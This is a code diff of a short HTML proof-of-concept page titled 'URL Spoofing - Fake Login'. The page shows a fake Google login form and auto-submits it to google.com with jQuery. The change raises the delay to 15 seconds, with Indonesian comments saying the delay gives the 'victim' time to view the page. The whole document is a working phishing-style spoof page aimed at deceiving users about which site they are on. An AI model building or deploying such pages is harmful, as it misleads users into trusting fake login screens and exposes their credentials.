@@ -1,23 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>URL Spoofing</title>
+  <title>URL Spoofing - Fake Login</title>
   <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js"></script>
 </head>
 <body>
   <br><br>
-  <h3>Google</h3>
-  <form id='formButton' method="POST" action="https://www.google.com:9090">
-    Username:<input type="text"></input><br>
-    Password:<input type="password"></input><br>
+  <h3>Google Login</h3>
+  <!-- Fake Login Form -->
+  <form id='formButton' method="POST" action="https://www.google.com">
+    Username:<input type="text" name="username"><br>
+    Password:<input type="password" name="password"><br>
     <button>Submit</button>
   </form>
-<script type="text/javascript">
-  $(document).ready(function() {
-    setTimeout(function() {
-      window.document.forms[0].submit();
-    },1);
-  });
-</script></body>
-</html>
 
+  <script type="text/javascript">
+    $(document).ready(function() {
+      setTimeout(function() {
+        // Mengirim form secara otomatis setelah 15 detik
+        window.document.forms[0].submit();
+      }, 15000);  // Delay 15 detik untuk memberi waktu kepada korban untuk melihat halaman
+    });
+  </script>
+</body>
+</html>
